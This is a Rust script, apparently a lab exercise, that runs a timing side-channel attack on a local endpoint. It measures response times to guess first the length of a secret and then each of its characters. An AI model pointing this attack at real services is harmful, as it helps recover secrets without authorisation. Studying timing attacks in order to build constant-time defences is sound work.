use std::time::Instant;
use std::time::Duration;




#[tokio::main]
async fn main(){

    let lenght_of_the_secret = get_the_length_of_secret().await;
    println!("Taille du secret  : {}", lenght_of_the_secret);

    let secret = get_the_secret(lenght_of_the_secret).await;
    println!("Le secret  : {}" ,  secret );

    
}



async fn get_the_length_of_secret() -> usize{

    let mut guess_characters = "a".to_string();
    let mut times_of_response: Vec<(usize, Duration)> = Vec::new();
    for i in 1..31{
        let url = format!("http://localhost:3000/seiko_secret?user_secret={}", guess_characters);
        let start = Instant::now();
        let _request = reqwest::get(&url).await;
        let end = start.elapsed();

        println!("Indice {} -> {:?}",i,end);
        times_of_response.push((i,end));
        guess_characters+="a";

    }

    return find_the_length(times_of_response)

}               

fn find_the_length(times_of_response  : Vec<(usize, Duration)>) -> usize{

    let mut indice_max = 0;
    let mut time_max = Duration::ZERO;

    for (i,t) in times_of_response.iter(){
        if *t > time_max {
            indice_max = *i;
            time_max = *t
        }
    }

    return indice_max;
}


async fn get_the_secret(length_of_secret : usize) -> String{

    let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut secret = String::new();

    for i in 0..length_of_secret{

        let mut times_of_response : Vec<(String, Duration)> = Vec::new();

        for c in characters.chars(){
            let guess_characters = secret.clone() + &c.to_string() + &"a".repeat(length_of_secret - i - 1);
            let url = format!("http://localhost:3000/seiko_secret?user_secret={}", guess_characters);
            let start = Instant::now();
            let _request = reqwest::get(&url).await;
            let end = start.elapsed();

            times_of_response.push((c.to_string(),end));
        }
        let mut bestCaracter = "";
        let mut time_max = Duration::ZERO;

        for (c,t) in times_of_response.iter(){
            if *t > time_max {
                bestCaracter = &*c;
                time_max = *t
            }
        }

        println!("Meilleur c : {}", bestCaracter);

        secret+=bestCaracter;
    }
    return secret;
}